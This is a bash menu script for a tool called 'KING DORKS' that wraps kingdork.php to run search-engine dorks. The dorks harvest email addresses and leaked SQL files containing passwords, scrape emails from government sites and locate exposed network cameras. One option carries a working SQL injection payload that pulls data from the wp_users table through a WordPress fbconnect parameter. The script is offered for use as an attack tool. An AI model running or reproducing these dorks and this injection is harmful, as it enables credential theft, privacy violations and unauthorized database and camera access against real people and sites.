#!/bin/bash
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White
clear                                                                        
	echo -e $BRed"                                           _"                                                
	echo -e $BRed"                                          |_|"                                
	echo -e $BRed"                          _____   _    __  _    _          ____    ___      ________          _    _"
	echo -e $BRed"                         (_____) | |  / / | |  | |        |  | |  |   \   (         ) ||  // | |  / /"
	echo -e $BRed"                         (() ()) | | / /  | |  | |______  |  | |  |    \  (         ) || //  | | / /"
	echo -e $BRed"                          \   /  | |/ /   | |  | |______| |__|_|  |     \ (         ) ||//   | |/ /"
	echo -e $BRed"                           \ /   | |\ \   | |  | |    | |     ||  |     / (         ) ||_)   | |\ \\"
	echo -e $BRed"                           /=\   | | \ \  | |  | |    | |  ___||  |    /  (         ) ||     | | \ \\"
	echo -e $BRed"                          [___]  |_|  \_\ |_|  |_|    |_| |___||  |___/   (_________) ||     |_|  \_\\"                                
                                                                   
echo                                                                                                                                                                        
echo  '                                         this tools for advance scan dorks. good luck         '
echo
echo
echo -e $BRed "                                                                                           Creator:$(echo -e $BWhite" Dante Nourallah")"
echo
echo 
echo
echo
echo
echo
echo
while true
do

read -p "$(echo -e $BBlue"[KING DORKS]")$(echo -e $BRed" >>>>>> "$(echo -e $BWhite""))"  menu act
if [ "$menu" == 'start'  ] && [ "$act" == "search dork email" ]
then  
./kingdork.php --dork 'email (gmail|hotmail|yahoo) ext:txt' -s scan1.txt -m
elif [ "$menu" == "start" ] && [ "$act" == "search ip info" ]
then
read -p "$(echo -e $BBlue"[KING DORKS] $(echo -e $BRed"Enter the ip target :")")$(echo -e $BWhite"") " ip
./ipgeolocation.py -t $ip
elif [ "$menu" == "start" ] && [ "$act" == "search dork website and show the linke database" ]
then
./kingdork.php --dork 'intext:password email (gmail|hotmail|yahoo) ext:sql' -s scan.txt --ifcode 200
elif [ "$menu" == "start" ] && [ "$act" == "scan email from gov website" ]
then
php kingdork.php --dork 'site:.mg.gov.br email & (hotmail|gmail|yahoo) -site:admin.araguari.gov.il ext:xls' -s gov.txt -q 1 -m
./kingdork.php --dork 'intext:password email (gmail|hotmail|yahoo) ext:sql' -s scan.txt --ifcode 200
elif [ "$menu" == 'start' ] && [ "$act" == "search dork camera" ]
then 
php ./kingdork.php --dork 'inurl:"ViewerFrame?Mode=Motion" & intitle:"Network Camera"' -s can.log -t 2000 -a 'Resolution'
elif [ "$menu" == 'start' ] && [ "$act" == "search dork fbconnect" ] 
then 
 php ./kingdrok.php --dork 'inurl:"?fbconnect_action=" ' -s sqli.txt -q 1,6 --exploit-get '/?fbconnect_action=myhome&fbuserid=1 and 1=2 union select 1,2,3,4,5,group_concat(0x78706c5f73756363657373),7,8,9,10,11,12 from wp_users where id > 0' -t 2 -s 'xpl_success' --unique
elif [ "$menu" == "search" ]
then
php ./kingdork.php --dork "$act" -s dork.txt	


## HELP
elif [ "$menu" == "show" ] && [ "$act" == "option" ] || [ "$act" == "options" ]
then
echo
echo -e $BGreen "1) $(echo -e $BWhite"start search dork website and show the linke database")"
echo -e $BGreen "2) $(echo -e $BWhite"start search dork camera")"
echo -e $BGreen "3) $(echo -e $BWhite"start search dork fbconnect")"
echo -e $BGreen "4) $(echo -e $BWhite"start search dork email")"
echo -e $BGreen "5) $(echo -e $BWhite"start scan email from gov website")"
echo -e $BGreen "6) $(echo -e $BWhite"search [DORK]")"
echo
elif [ "$menu" == "help" ] || [ "$menu" == "Help" ] || [ "$menu" == "HELP" ]
then
echo
echo -e $BBlue "Options: "
echo
echo -e $BGreen "        show options$(echo -e $BWhite"          use to show tool options")"
echo -e $BGreen "        help$(echo -e $BWhite"                  use to show this message")"
echo -e $BGreen "        verison$(echo -e $BWhite"               use to show tool version")"
echo -e $BGreen "        info$(echo -e $BWhite"                  use to show info about tools and creator")"
echo
elif [ "$menu" == "verison" ] || [ "$menu" == "VERISON" ] || [ "$menu" == "Verison" ]
then
echo
echo "1.0"
echo "    Dante Nourallah"
echo
elif [ "$menu" == "info" ] || [ "$menu" == "INFO" ] || [ "$menu" == "Info" ]
then
echo "iam created the tool please contact me in facebook my profile https://www.facebook.com/dante.nourllah?ref=bookmarks"
else
	echo -e $BBlue"(*)$(echo -e $BWhite "Options not found")"


fi
done
